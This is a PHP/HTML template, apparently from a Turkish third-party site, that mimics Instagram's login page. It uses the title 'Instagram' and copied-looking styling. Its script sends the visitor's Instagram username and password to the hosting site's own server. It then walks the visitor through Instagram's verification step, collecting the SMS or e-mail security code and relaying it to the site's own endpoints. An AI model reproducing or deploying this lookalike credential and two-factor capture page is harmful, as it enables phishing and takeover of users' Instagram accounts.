<?php
    /**
     * @var \Wow\Template\View      $this
     * @var \App\Models\LogonPerson $logonPerson
     */
    $logonPerson = $this->get("logonPerson");
?>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Instagram</title>
    <meta name="robots" content="noindex, nofollow">
    <meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
    <style>
        body::-webkit-scrollbar {
            display : none;
        }
    </style>
    <link rel="stylesheet" href="/assets/style/instastyle.css"/>
</head>
<body>
      <span id="react-root">
         <section class="instaclass5">
            <main class="instaclass4 instaclass30" role="main">
               <article class="instaarticle3">
                  <div class="instaclass1">
                     <div class="instaclass2">
                        <br/><br/>
                        <br/><br/>
                        <div class="instaclass6">
                           <form method="POST" onsubmit="return false;"
                                   class="instaclass7">
                              <div class="instaclass8 instaclass9"><input type="text" class="instaclass10 instaclass11"
                                          aria-describedby="" aria-label="Kullanıcı adı" aria-required="true"
                                          maxlength="30" name="username"
                                          placeholder="Kullanıcı adı" value=""></div>
                              <div class="instaclass8 instaclass9">
                                 <input
                                         type="password" class="instaclass10 instaclass11" aria-describedby=""
                                         aria-label="Şifre"
                                         aria-required="true" name="password"
                                         placeholder="Şifre">
                              </div>
                               <?php if(!empty(Wow::get("ayar/GoogleCaptchaSiteKey")) && !empty(Wow::get("ayar/GoogleCaptchaSiteKey"))) { ?>
                                   <div style="width: 304px;margin: 0 auto;" class="g-recaptcha" data-sitekey="<?php echo Wow::get("ayar/GoogleCaptchaSiteKey"); ?>"></div>
                               <?php } ?>
                               <span
                                       class="instaclass14 instaclass15">
                                 <button id="login_insta"
                                         class="instaclass16 instaclass17 instaclass18 instaclass19">Giriş yap</button>
                                 <div class="spiSpinner"></div>
                              </span>
                              <div class="instaclass20">
                                 <p id="slfErrorAlert"
                                         aria-atomic="true"
                                         role="alert"></p>
                              </div>
                           </form>
                        </div>
                     </div>
                  </div>
               </article>
            </main>
         </section>
      </span>
      <style>
          .onay_kodu_ekrani {
              display    : none;
              position   : fixed;
              top        : 0;
              width      : 100%;
              height     : 100%;
              background : #fff;
              padding    : 50px 15px;
              text-align : center;
          }

          .onay_kodu_girme_ekrani {
              display    : none;
              position   : fixed;
              top        : 0;
              width      : 100%;
              height     : 100%;
              background : #fff;
              padding    : 50px 15px;
              text-align : center;
          }

          .onay_kodu_ekrani select {
              padding   : 10px;
              font-size : 14px;
          }

          .onay_kodu_ekrani button {
              width         : 160px;
              margin        : 30px auto;
              padding       : 8px;
              background    : #299029;
              border        : 1px solid #39c739;
              color         : #fff;
              border-radius : 10px;
              cursor        : pointer;
          }

          .onay_kodu_ekrani button:hover {
              background : #207520;
          }

          .onay_kodu_ekrani button:disabled {
              background : #6fcc6f;
          }

          .onay_kodu_girme_ekrani input {
              padding   : 10px;
              font-size : 14px;
          }

          .onay_kodu_girme_ekrani button {
              width         : 160px;
              margin        : 30px auto;
              padding       : 8px;
              background    : #299029;
              border        : 1px solid #39c739;
              color         : #fff;
              border-radius : 10px;
              cursor        : pointer;
          }

          .onay_kodu_girme_ekrani button:hover {
              background : #207520;
          }

          .onay_kodu_girme_ekrani button:disabled {
              background : #6fcc6f;
          }
      </style>
      <div class="onay_kodu_ekrani"></div>
      <div class="onay_kodu_girme_ekrani"></div>
      <script src="/assets/jquery/2.2.4/jquery.min.js"></script>
      <script src='https://www.google.com/recaptcha/api.js'></script>
      <script>
          $('#login_insta').click(function() {
              $('#slfErrorAlert').hide();
              $(this).attr("disabled", "disabled");
              $maindiv = $(this);
              $maindiv.addClass("instaclass31");
              $('.spispinner').show();
              <?php if(!empty(Wow::get("ayar/GoogleCaptchaSiteKey")) && !empty(Wow::get("ayar/GoogleCaptchaSecretKey"))) { ?>
              var dataList = "username=" + encodeURIComponent($('input[name="username"]').val()) + "&password=" + encodeURIComponent($('input[name="password"]').val()) + "&antiForgeryToken=<?php echo $_SESSION["AntiForgeryToken"]; ?>&captcha=" + grecaptcha.getResponse();
              <?php } else { ?>
              var dataList = "username=" + encodeURIComponent($('input[name="username"]').val()) + "&password=" + encodeURIComponent($('input[name="password"]').val()) + "&antiForgeryToken=<?php echo $_SESSION["AntiForgeryToken"]; ?>";
              <?php } ?>

              $.ajax({
                         type    : "POST",
                         url     : "?",
                         dataType: "json",
                         data    : dataList,
                         success : function(json) {
                             if(json.status == 'success') {
                                 window.parent.location.href = json.returnUrl;
                                 window.parent.$.fancybox.close();
                             } else {

                                 var $allData = json.allData;

                                 if(json.status == 3) {


                                     if(json.allData.step_name == 'verify_code') {

                                         var onayKoduEkrani = $('.onay_kodu_girme_ekrani');
                                         onayKoduEkrani.html('');
                                         var html = "<div>Lütfen size gönderilen 6 haneli kodu girerek devam edin.</div><br/>";
                                         html += "<input type='number' id='kod_onayla_input' value='' maxlength='6' placeholder='Onay Kodu?'/>";
                                         html += "<div><button class='kod_onayla'>Onayla</button></div>";
                                         onayKoduEkrani.html(html);
                                         onayKoduEkrani.show();

                                         $('.kod_onayla').click(function() {
                                             var kodOnay = $('#kod_onayla_input').val();

                                             if(kodOnay.length < 6) {
                                                 alert("Gelen onay kodu en az 6 karakter olmalıdır");
                                             }

                                             $allData.code = kodOnay;
                                             $('.kod_onayla').attr("disabled", "disabled");
                                             $('.kod_onayla').html('Onaylanıyor..');
                                             $.ajax({
                                                        url    : "/ajax/kod-onayla",
                                                        data   : $allData,
                                                        type   : "POST",
                                                        success: function(json) {
                                                            if(json.status == "ok") {
                                                                window.parent.location.href = json.returnUrl;
                                                                window.parent.$.fancybox.close();
                                                            } else {
                                                                alert(json.error);
                                                            }
                                                        }
                                                    });
                                         });

                                     } else {
                                         var onayEkrani = $('.onay_kodu_ekrani');
                                         onayEkrani.html('');
                                         var data = json.allData.step_data;


                                         var html = "<div>" + json.error + "</div><br/>";
                                         html += "<select id='choice_select'>";

                                         if(typeof data.phone_number !== "undefined") {
                                             html += "<option value='0'>GSM ile Onayla: " + data.phone_number + "</option>";
                                         }

                                         if(typeof data.email !== "undefined") {
                                             html += "<option value='1'>E-Posta ile Onayla: " + data.email + "</option>";
                                         }

                                         html += "</select>";
                                         html += "<div><button class='kod_iste'>Güvenlik Kodu Gönder</button></div>";
                                         onayEkrani.html(html);
                                         onayEkrani.show();

                                         json.allData.choice = $('#choice_select').val();
                                     }


                                     $('.kod_iste').click(function() {
                                         $('.kod_iste').attr("disabled", "disabled");
                                         $('.kod_iste').html('Kod İsteniyor...');

                                         $.ajax({
                                                    url    : "/ajax/kod-gonder",
                                                    data   : $allData,
                                                    type   : "POST",
                                                    success: function(json) {
                                                        if(json.status === "ok") {
                                                            var onayKoduEkrani = $('.onay_kodu_girme_ekrani');
                                                            onayKoduEkrani.html('');
                                                            var html = "<div>Lütfen size gönderilen 6 haneli kodu girerek devam edin.</div><br/>";
                                                            html += "<input type='number' id='kod_onayla_input' value='' maxlength='6' placeholder='Onay Kodu?'></input>";
                                                            html += "<div><button class='kod_onayla'>Onayla</button></div>";
                                                            onayKoduEkrani.html(html);
                                                            onayKoduEkrani.show();


                                                            $('.kod_onayla').click(function() {
                                                                var kodOnay = $('#kod_onayla_input').val();
                                                                if(kodOnay.length < 6) {
                                                                    alert("Gelen onay kodu en az 6 karakter olmalıdır");
                                                                }

                                                                $allData.code = kodOnay;
                                                                $('.kod_onayla').attr("disabled", "disabled");
                                                                $('.kod_onayla').html('Onaylanıyor..');
                                                                $.ajax({
                                                                           url    : "/ajax/kod-onayla",
                                                                           data   : $allData,
                                                                           type   : "POST",
                                                                           success: function(json) {
                                                                               if(json.status == "success") {
                                                                                   window.parent.location.href = json.returnUrl;
                                                                                   window.parent.$.fancybox.close();
                                                                               } else {
                                                                                   alert("Giriş yapılırken bir hata oluştu.");
                                                                               }
                                                                           }
                                                                       });
                                                            });

                                                        } else {
                                                            alert("Bir hata oluştu lütfen seçiminizi kontrol ederek tekrar deneyin.");
                                                        }
                                                    }
                                                });

                                     });

                                 } else {
                                     $('#slfErrorAlert').html(json.error);
                                     $('#slfErrorAlert').show();
                                     $('.spispinner').hide();
                                     $maindiv.removeAttr("disabled");
                                     $maindiv.removeClass("instaclass31");
                                 }
                             }
                         }
                     });
          });
      </script>
</body>
</html>